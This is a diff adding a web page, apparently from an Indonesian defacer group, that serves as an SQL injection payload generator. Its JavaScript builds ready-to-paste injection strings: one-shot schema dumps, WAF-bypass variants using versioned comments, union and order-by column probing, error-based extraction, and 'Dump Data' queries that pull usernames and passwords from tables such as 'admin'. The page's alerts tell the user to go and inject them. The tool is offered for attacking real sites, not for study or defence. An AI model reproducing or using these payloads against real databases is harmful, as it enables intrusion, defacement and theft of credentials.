@@ -1,0 +1,444 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta name="description" content="Make U Eazily To Exploiting">
+      
+    <!-- Open Graph Meta-->
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Query SQL Injection - XploitSec Tools">
+    <meta property="og:title" content="Query SQL Injection - XploitSec Tools">
+    
+    <script>
+      function MainTance(){
+        swal("Coming Soon...", "Kami akan segera kembali", "info")
+      }
+    </script>
+    <title>Query SQL Injection - MCA Tools</title>
+<!-- -->
+    <!-- NO BUG BOUNTY PROGRAM -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="https://e.top4top.io/p_18508kitp0.jpg" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,XMRstylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="https://aafexploiterteam.my.id/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://aafexploiterteam.my.id/assets/vendor/icofont/icofont.min.css" rel="stylesheet">
+  <link href="https://aafexploiterteam.my.id/assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="https://aafexploiterteam.my.id/assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="https://aafexploiterteam.my.id/assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
+  <link href="https://aafexploiterteam.my.id/assets/vendor/venobox/venobox.css" rel="stylesheet">
+  <link href="https://aafexploiterteam.my.id/assets/vendor/aos/aos.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="https://aafexploiterteam.my.id/assets/css/style.css" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+  <!--Floating WhatsApp css-->
+  <link rel="stylesheet" href="https://rawcdn.githack.com/rafaelbotazini/floating-whatsapp/3d18b26d5c7d430a1ab0b664f8ca6b69014aed68/floating-wpp.min.css">
+  <!--Floating WhatsApp javascript-->
+  <script type="text/javascript" src="https://rawcdn.githack.com/rafaelbotazini/floating-whatsapp/3d18b26d5c7d430a1ab0b664f8ca6b69014aed68/floating-wpp.min.js">
+  </script>
+  </head>
+<!-- ======= Header ======= -->
+  <header id="header" class="fixed-top d-flex align-items-center">
+  <div class="container d-flex align-items-center">
+
+  <div class="logo mr-auto">
+  <h1 class="text-light"><a href="index.html"><span>MCA || OFFICIAL</span></a></h1>
+  
+    </div>
+
+  <nav class="nav-menu d-none d-lg-block">
+  <ul>
+  <li class="active"><a href="index.php">Home</a></li>
+  <li><a href="#about">About</a></li>
+  <ul class="list-unstyled components mb-5">
+<li>
+<a href="http://muslimcyberanonymous.freevar.com/tools" target="_blank">Tools</a></li>
+  <li><a href="https://wibu-elit.blogspot.com/?m=1" target="_blank">WIBU ELITE</a></li>
+  <li><a href="#contact">Contact</a></li>
+
+  <li class="get-started"><a href="https://shn.nasihosting.com/">Bergabung Sekarang</a></li>
+  </ul>
+  </nav><!-- .nav-menu -->
+
+  </div>
+  </header><!-- End Header -->
+ 
+  
+    </div>
+
+        
+<font color="red">
+<script>
+  	function copy() {
+			document.getElementById("query").select();
+			document.execCommand("copy");
+			alert("berhasil ke copy bwa");
+			alert("sekarang tinggal di inject");
+			alert("moga moga ga 403 :v");
+		}
+  	function populate(s1,s2){
+   			var s1 = document.getElementById(s1);
+   			var s2 = document.getElementById(s2);
+   			s2.innerHTML = "";
+   		if(s1.value == "User"){
+   			var optionArray = ["|","User1|User1","User2|User2","User3|User3","User4|User4","User5|User5"];
+  }else if(s1.value == "Version"){
+  			var optionArray = ["|","Version1|Version1","Version2|Version2","Version3|Version3","Version4|Version4","Version5|Version5"];
+  }else if(s1.value == "Database"){
+  			var optionArray = ["|","Database1|Database1","Database2|Database2","Database3|Database3"];
+  }else if(s1.value == "Dios"){
+  			var optionArray = ["|","Dios|Dios","Dios(Bypass)|Dios(Bypass)","Dump Data|Dump Data","Dump Data(Bypass)|Dump Data(Bypass)","BypassForm|Bypass Form","Postgre|Postgre","Errbased|Error Based"];
+  }else if(s1.value == "system"){
+  			var optionArray = ["|","HOSTNAME|HOSTNAME","VERSION_COMPILE_MACHINE|VERSION_COMPILE_MACHINE","VERSION_COMPILE_OS|VERSION_COMPILE_OS","BASEDIR|BASEDIR","HV_OPENSSL|HV_OPENSSL","HV_SYMLINK|HV_SYMLINK","PORT|PORT","SOCKET|SOCKET"];
+  }else if(s1.value == "CG"){
+  			var optionArray = ["|","Order By|Order By","Order By(Bypass)|Order By(Bypass)","Group By|Group By","Union|Union","Union(Bypass)|Union(Bypass)","GenerateC|Hitung Jumlah Kolom","GenerateT|Hitung Jumlah Tabel","GenerateD|Hitung Jumlah Database"]
+  }
+  
+ for(var option in optionArray) {
+   				var pair = optionArray[option].split("|");
+   				var newOption = document.createElement("option");
+   				newOption.value = pair[0];
+   				newOption.innerHTML = pair[1];
+   				s2.options.add(newOption);
+   			}
+   		}
+   		
+   	function querystr(){
+   		var query = document.getElementById('slct2');
+   		if(query.value == "User1"){
+   			var u1 = "@@user()";
+   			document.getElementById('query').value = u1;
+   		}else if(query.value == "User2"){
+   			var u2 = "@@CURRENT_USER()";
+   			document.getElementById('query').value = u2;
+   		}else if(query.value == "User3"){
+   			var u3 = "SYSTEM_USER()";
+   			document.getElementById('query').value = u3;
+   	}else if(query.value == "User4"){
+   			var u4 = "SESSION_USER()";
+   			document.getElementById('query').value = u4;
+   	}else if(query.value == "User5"){
+   			var u5 = "SUBSTRING_INDEX(USER(),0x40,1)";
+   			document.getElementById('query').value = u5;
+   			
+   			
+   	}else if(query.value == "Version1"){
+   			var ver1 = "version()";
+   			document.getElementById('query').value = ver1;
+   	}else if(query.value == "Version2"){
+   			var ver2 = "@@version";
+   			document.getElementById('query').value = ver2;
+   	}else if(query.value == "Version3"){
+   			var ver3 = "@@GLOBAL.version";
+   			document.getElementById('query').value = ver3;
+   	}else if(query.value == "Version4"){
+   			var ver4 = "(select+variable_value+from+information_schema.session_variables+where+variable_name+like+0x56455253494f4e)";
+   			document.getElementById('query').value = ver4;
+   	}else if(query.value == "Version5"){
+   			var ver5 = "(Select+variable_value+from+information_schema.global_variables+where+variable_name=0x76657273696f6e)";
+   			document.getElementById('query').value = ver5;
+   			
+   			
+   	}else if(query.value == "Database1"){
+   			var db1 = "database()";
+   			document.getElementById('query').value = db1;
+   	}else if(query.value == "Database2"){
+   			var db2 = "schema()";
+   			document.getElementById('query').value = db2;
+   	}else if(query.value == "Database3"){
+   			var db3 = "(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
+   			document.getElementById('query').value = db3;
+   			
+   			
+   	}else if(query.value == "HOSTNAME"){
+   			var s1 = "@@HOSTNAME";
+   			document.getElementById('query').value = s1;
+   	}else if(query.value == "VERSION_COMPILE_MACHINE"){
+   			var s2 = "@@VERSION_COMPILE_MACHINE";
+   			document.getElementById('query').value = s2;
+   	}else if(query.value == "VERSION_COMPILE_OS"){
+   			var s3 = "@@VERSION_COMPILE_OS";
+   			document.getElementById('query').value = s3;
+   	}else if(query.value == "VERSION_COMPILE_MACHINE"){
+   			var s4 = "@@VERSION_COMPILE_MACHINE";
+   			document.getElementById('query').value = s4;
+   	}else if(query.value == "VERSION_COMPILE_MACHINE"){
+   			var s5 = "@@VERSION_COMPILE_MACHINE";
+   			document.getElementById('query').value = s5;
+   	}else if(query.value == "BASEDIR"){
+   			var s6 = "@@BASEDIR";
+   			document.getElementById('query').value = s6;
+   	}else if(query.value == "HV_OPENSSL"){
+   			var s7 = "@@HV_OPENSSL";
+   			document.getElementById('query').value = s7;
+   	}else if(query.value == "HV_SYMLINK"){
+   			var s8 = "@@HV_SYMLINK";
+   			document.getElementById('query').value = s8;
+   	}else if(query.value == "PORT"){
+   			var s9 = "@@PORT";
+   			document.getElementById('query').value = s9;
+   	}else if(query.value == "SOCKET"){
+   			var s10 = "@@SOCKET";
+   			document.getElementById('query').value = s10;
+   			
+   			
+   	}else if(query.value == "Dios"){
+   			var dios = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
+   			document.getElementById('query').value = dios;
+   	}else if(query.value == "Dios(Bypass)"){
+   			var dios403 = "/*!12345make_set*/(6,@:=0x0a,(select(1)/*!12345from*/(/*!12345information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!12345table_name*/,/*!12345column_name*/)),@)";
+   			document.getElementById('query').value = dios403;
+   	}else if(query.value == "BypassForm"){
+   			var bForm = "+and@r4nd5:=concat(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x203a3a20,column_name)),@)+/*!50000UNION*/+SELECT+";
+   			document.getElementById('query').value = bForm;
+   	}else if(query.value == "Postgre"){
+   			var postgre = "(select+string_agg(concat(table_name,'::',column_name),$$<li>$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
+   			document.getElementById('query').value = postgre;
+   	}else if(query.value == "Errorbased"){
+   			var errbsd = "(SELECT!x-~0.FROM(SELECT(concat_ws(0x3a3a,user(),@@version,database(),concat(@:=0,(Select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)))x)a)";
+   			document.getElementById('query').value = errbsd;
+   	}else if(query.value == "Order By"){
+   			var columns = prompt( "Order By ?", "22" );
+    columns = Math.min(1000, parseInt( columns ));
+    var colArray = new Array();
+    for ( var i = 0 ; i < columns ; i++ ) {
+      colArray.push( i+1 );
+    }
+    var kolom = "+order+by+" + colArray.join( ',' ) + ('--+'); document.getElementById('query').value = kolom;
+   	}else if(query.value == "Order By(Bypass)"){
+   			var columns = prompt( "Order By ?", "22" );
+    columns = Math.min(1000, parseInt( columns ));
+    var colArray = new Array();
+    for ( var i = 0 ; i < columns ; i++ ) {
+      colArray.push( i+1 );
+    }
+    var kolom = "+/*!50000order*/+/*!50000by*/+" + colArray.join( ',' ) + ('--+-'); document.getElementById('query').value = kolom;
+   	}else if(query.value == "Group By"){
+   			var columns = prompt( "Group By ?", "22" );
+    columns = Math.min(1000, parseInt( columns ));
+    var colArray = new Array();
+    for ( var i = 0 ; i < columns ; i++ ) {
+      colArray.push( i+1 );
+    }
+    var kolom = "+GROUP+BY+" + colArray.join( ',' ) + ('--+'); document.getElementById('query').value = kolom;
+   	}else if(query.value == "Union"){
+   			var columns = prompt( "Union Select ?", "22" );
+    columns = Math.min(1000, parseInt( columns ));
+    var colArray = new Array();
+    for ( var i = 0 ; i < columns ; i++ ) {
+      colArray.push( i+1 );
+    }
+    var kolom = "+union+select+" + colArray.join( ',' ) + ('--+'); document.getElementById('query').value = kolom;
+   	}else if(query.value == "Union(Bypass)"){
+   			var columns = prompt( "Union Select ?", "22" );
+    columns = Math.min(1000, parseInt( columns ));
+    var colArray = new Array();
+    for ( var i = 0 ; i < columns ; i++ ) {
+      colArray.push( i+1 );
+    }
+    var kolom = "+/*!50000union*/+/*!50000select*/+" + colArray.join( ',' ) + ('--+-'); document.getElementById('query').value = kolom;
+   	}else if(query.value == "GenerateD"){
+var dbc = "concat(0x546f74616c20446174616261736573203e3e20,(select+count(*)from+information_schema.schemata))";
+document.getElementById('query').value = dbc;
+   	}else if(query.value == "GenerateT"){
+var tottbl = "concat(0x546f74616c205461626c6573203e3e20,(select+count(*)from+information_schema.tables+where+table_Schema=database()))";
+document.getElementById('query').value = tottbl;
+   	}else if(query.value == "GenerateC"){
+var totcol = "concat(0x546f74616c20436f6c756d6e73203e3e20,(select+count(*)from+information_schema.columns+where+table_Schema=database()))"; 
+document.getElementById('query').value = totcol;
+   	}else if(query.value == "Dump Data"){
+   		var columns = prompt( "Nama table ?", "admin" );
+   		var columms = alert("Nama kolom isi sendiri ea");
+   		var koloms =  columns;
+   		var datas = "make_set(6,@:=0x0a,(select(1)from(" + koloms + (")where@:=make_set(511,@,0x3c6c693e,USER_NAME,PASSWORD)),@)");
+   		document.getElementById('query').value = datas;
+   	}else if(query.value == "Dump Data(Bypass)"){
+   		var columns = prompt( "Nama table ?", "admin" );
+   		var columms = alert("Nama kolom isi sendiri ea");
+   		var koloms =  columns;
+   		var datas = "/*!12345make_set*/(6,@:=0x0a,(select(1)/*!12345from*/(/*!12345" + koloms + ("*/)where@:=make_set(511,@,0x3c6c693e,/*!12345USER_NAME*/,/*!12345USER_PASS*/)),@)");
+   		document.getElementById('query').value = datas;
+   	}
+ }
+  </script>
+
+<main class="app-content">
+	<div class="app-title">
+		<div>
+          <h1><i class="fa fa-cog"></i> Defacer Tools</h1>
+        </div>
+        <ul class="app-breadcrumb breadcrumb">
+          <a href="http:/muslimcyberanonymous.freevar.com/">
+          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg">home</i></a></li>
+          <li class="breadcrumb-item">Query Sqli</li>
+        </ul>
+      </div>
+	</div>
+
+<div class="row">
+	<div class="col-md-6">
+		<div class="tile"><hr>
+			<div class="row">
+    		<div class="col">
+    			<select class="custom-select" id="slct1" name="slct1" onchange="populate(this.id,'slct2')">
+    		<option selected="selected">Select Query</option>
+    		<option value="User">User</option>
+    		<option value="Version">Version</option>
+    		<option value="Database">Database</option>
+    		<option value="Dios">Dump In Shot</option>
+    		<option value="system">System Variable</option>
+    		<option value="CG">Count & Generate</option>
+    	</select>
+    		</div>
+    		<div class="col">
+    			<select name="slct2" id="slct2" class="custom-select">
+    				<option selected="selected">Query</option>
+    			</select>
+    		</div>
+    	</div><br>
+    	<style>
+img[alt*="www.000webhost.com"]{
+display:none
+}
+</style>
+    	<div class="row">
+    		<div class="col-md-6">
+    			<button type="submit" name="submit" class="btn btn-primary btn-block mt-3" onclick="querystr()">Use Query</button>
+    		</div>
+    		<div class="col-md-6">
+    			<button type="submit" name="submit" class="btn btn-primary btn-block mt-2" onclick="copy()">Copy Query</button>
+    		</div>
+    	</div>
+		</div>
+.	</div>
+<br>
+<br>
+	<div class="col-md-6">
+		<div class="tile">
+			<textarea id="query" class="form-control bg-color"red" rows="6" placeholder="Hasil Querynya bwa" readonly="readonly"></textarea>
+		</div>
+	</div>
+</div>
+
+
+</main>
+<br>
+<div class="row">
+    		<div class="col-md-6">
+    			<button type="readonly" name="readonly" class="btn btn-primary btn-block mt-3" rows="1" onclick="none">Copyright©./BabwaXgura</textarea></button>
+		</div>
+	</div>
+	  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="row d-flex align-items-center">
+        <div class="col-lg-6 text-lg-left text-center">
+          <div class="copyright">
+            &copy; Copyright <strong>BabwaXgura</strong>. All Rights Reserved
+          </div>
+          <div class="credits">
+            Designed by <a href="http://muslimcyberanonymous.freevar.com">./BabwaXgura</a>
+          </div>
+        </div>
+        <div class="col-lg-6">
+          <nav class="footer-links text-lg-right text-center pt-2 pt-lg-0">
+            <a href="#intro" class="scrollto">Home</a>
+            <a href="#about" class="scrollto">About</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Use</a>
+          </nav>
+        </div>
+      </div>
+    </div>
+  </footer>
+  <!-- End Footer -->
+ <!-- Vendor JS Files -->
+ <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+ <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/jquery/jquery.min.js"></script> 
+ <script src="https://aafexploiterteam.my.id/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/jquery.easing/jquery.easing.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/jquery.easing/jquery.easing.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/php-email-form/validate.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/waypoints/jquery.waypoints.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/counterup/counterup.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/owl.carousel/owl.carousel.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/venobox/venobox.min.js"></script>
+ <script src="https://aafexploiterteam.my.id/assets/vendor/aos/aos.js"></script>
+ <!-- Template Main JS File -->
+ <script src="https://aafexploiterteam.my.id/assets/js/main.js"></script>
+ </body> 
+<script src="https://tools.xploitsecid.or.id/js/jquery-3.2.1.min.js"></script>
+    <script src="https://tools.xploitsecid.or.id/js/popper.min.js"></script>
+    <script src="https://tools.xploitsecid.or.id/js/bootstrap.min.js"></script>
+    <script src="https://tools.xploitsecid.or.id/js/main.js"></script>
+    <!-- The javascript plugin to display page loading on top-->
+    <script src="https://tools.xploitsecid.or.id/js/plugins/pace.min.js"></script>
+    <!-- Page specific javascripts-->
+    <script type="text/javascript" src="https://tools.xploitsecid.or.id/js/plugins/chart.js"></script>
+    <script type="text/javascript">
+      var data = {
+      	labels: ["January", "February", "March", "April", "May"],
+      	datasets: [
+      		{
+      			label: "My First dataset",
+      			fillColor: "rgba(220,220,220,0.2)",
+      			strokeColor: "rgba(220,220,220,1)",
+      			pointColor: "rgba(220,220,220,1)",
+      			pointStrokeColor: "#fff",
+      			pointHighlightFill: "#fff",
+      			pointHighlightStroke: "rgba(220,220,220,1)",
+      			data: [65, 59, 80, 81, 56]
+      		},
+      		{
+      			label: "My Second dataset",
+      			fillColor: "rgba(151,187,205,0.2)",
+      			strokeColor: "rgba(151,187,205,1)",
+      			pointColor: "rgba(151,187,205,1)",
+      			pointStrokeColor: "#fff",
+      			pointHighlightFill: "#fff",
+      			pointHighlightStroke: "rgba(151,187,205,1)",
+      			data: [28, 48, 40, 19, 86]
+      		}
+      	]
+      };
+      var pdata = [
+      	{
+      		value: 300,
+      		color: "#46BFBD",
+      		highlight: "#5AD3D1",
+      		label: "Complete"
+      	},
+      	{
+      		value: 50,
+      		color:"#F7464A",
+      		highlight: "#FF5A5E",
+      		label: "In-Progress"
+      	}
+      ]
+      
+      var ctxl = $("#lineChartDemo").get(0).getContext("2d");
+      var lineChart = new Chart(ctxl).Line(data);
+      
+      var ctxp = $("#pieChartDemo").get(0).getContext("2d");
+      var pieChart = new Chart(ctxp).Pie(pdata);
+    </script>
+    <!-- Google analytics script-->
+    <script type="text/javascript">
+      if(document.location.hostname == 'pratikborsadiya.in') {
+      	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      	ga('create', 'UA-72504830-1', 'auto');
+      	ga('send', 'pageview');
+      }
+    </script>
+  </body>
+</html>
